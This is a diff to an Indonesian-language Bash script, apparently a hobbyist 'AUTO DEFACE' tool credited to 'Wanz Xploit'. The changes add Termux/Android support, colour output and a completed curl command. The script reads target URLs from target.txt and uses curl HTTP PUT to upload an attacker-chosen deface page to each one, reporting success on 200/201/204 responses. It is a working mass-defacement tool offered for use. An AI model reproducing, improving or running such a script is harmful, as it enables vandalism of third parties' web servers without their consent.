@@ -7,31 +7,54 @@
 
 # Cek apakah figlet sudah terinstall, jika belum maka install figlet
 if ! command -v figlet &> /dev/null; then
-  echo "Figlet belum terinstall, menginstall figlet ..."
+  echo -e "\e[31mFiglet belum terinstall, menginstall figlet ...\e[0m"
   echo ""
-  apt update
-  apt install figlet -y
+  if [[ "$(uname -s)" == "Linux" ]]; then
+    sudo apt update
+    sudo apt install figlet -y
+  elif [[ "$(uname -s)" == "Android" ]]; then
+    pkg update
+    pkg install figlet -y
+  fi
   echo ""
 fi
-# Nama figlet
+
+# Minta akses ke storage di Android
+if [[ "$(uname -s)" == "Android" ]]; then
+  termux-setup-storage
+fi
+
+# Output tampilan awal
+echo -e "\e[33m"
+figlet -f standard "AUTO DEFACE"
+echo -e "\e[32m"
+echo "=============================="
+echo "     Code By Wanz Xploit"
+echo "          Open source"
+echo "=============================="
 echo ""
-echo ""
-figlet -f slant "AUTO DEFACE"
-echo "Code By Wanz Xploit || Open source"
-echo ""
+
+# Pindahkan file index.html ke sdcard atau penyimpanan internal
+if [[ "$(uname -s)" == "Linux" ]]; then
+  sudo cp index.html /mnt/sdcard/
+elif [[ "$(uname -s)" == "Android" ]]; then
+  cp index.html ~/storage/shared/
+fi
+
 # Masukkan nama file yang akan diupload
 read -p "Masukkan nama Sc deface kalian: " filename
 echo ""
+
 # Cek apakah file yang dimaksud ada atau tidak
 if [ -f "/sdcard/$filename" ]; then
-  echo "Deface menggunakan file $filename ..."
+  echo -e "\e[33mDeface menggunakan file $filename ...\e[0m"
   echo ""
   echo "============================"
   # Baca file target.txt dan upload file dengan curl
   while IFS= read -r url; do
     echo "Deface to: $url"
-    result=$(curl -s -T "/sdcard/$filename" "$url" --max-time 10 --wr>
-    if [ $result -eq 201 ] || [ $result -eq 204 ] || [ $result -eq 20>
+    result=$(curl -s -T "/sdcard/$filename" "$url" --max-time 10 --write-out "%{http_code}\n" -o /dev/null)
+    if [ $result -eq 201 ] || [ $result -eq 204 ] || [ $result -eq 200 ]; then
       echo -e "\e[32mDeface berhasil ke $url\e[0m"
       echo ""
     else
@@ -40,5 +63,5 @@ if [ -f "/sdcard/$filename" ]; then
     fi
   done < target.txt
 else
-  echo "File tidak ditemukan!"
+  echo -e "\e[31mFile tidak ditemukan!\e[0m"
 fi
